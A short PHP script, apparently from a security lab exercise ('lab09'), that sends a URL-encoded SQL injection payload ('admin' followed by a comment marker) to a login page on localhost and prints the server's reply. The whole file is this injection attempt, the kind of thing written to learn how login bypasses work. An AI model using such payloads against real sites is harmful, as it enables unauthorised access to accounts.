<?php
   $url="http://localhost/lab09/login.php?u=\"%27admin%27%20--%20";
   $result = file_get_contents($url);

   print($result);

   echo "\n"

?>